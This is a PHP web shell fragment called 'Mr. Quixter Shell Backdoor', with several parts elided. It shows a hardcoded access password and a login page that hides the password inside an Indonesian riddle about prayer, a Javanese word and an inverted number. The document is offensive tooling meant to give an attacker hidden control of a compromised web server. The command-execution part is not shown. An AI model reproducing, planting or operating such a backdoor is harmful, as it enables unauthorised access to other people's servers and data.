...
$MyPass = 'akusiapa'; // Password: view-source:urlweb.com/shell.php
...
echo "<center><font size='6px' color='lavender'>F3RSH3LL GANS</font><br></center>
    <div class='pausi'>
...
{
    global $MyPass;
    echo "  <title>Mr. Quixter Shell Backdoor</title>
  ...
  </style><center><center><br><br>
  <pre>
••Mr. Quixter••<br><br>
Pertanyaan::<br>
1. Hal yang pokok yang tidak boleh ditinggalkan contohnya seperti alfatihah saat sholat adalah<br>
2. Percaya kepada Allah dan Rasul maka ucapkan syahadat serta meyakini di dalam hati, dan mengikrarkan<br>dengan pikiran Kemudian di wujudkan dalam perbuatan adalah<br>
3. Arti kata ana bahasa jawa jika di indonesiakan adalah<br>
4. Jika Angka 9 di balik maka akan menghasilkan angka<br>
Gabungkan Masing Masing Jawaban Dari Soal Nomor 1 2 3 dan 4 untuk memperoleh password
  </pre>
  <form method='POST'>
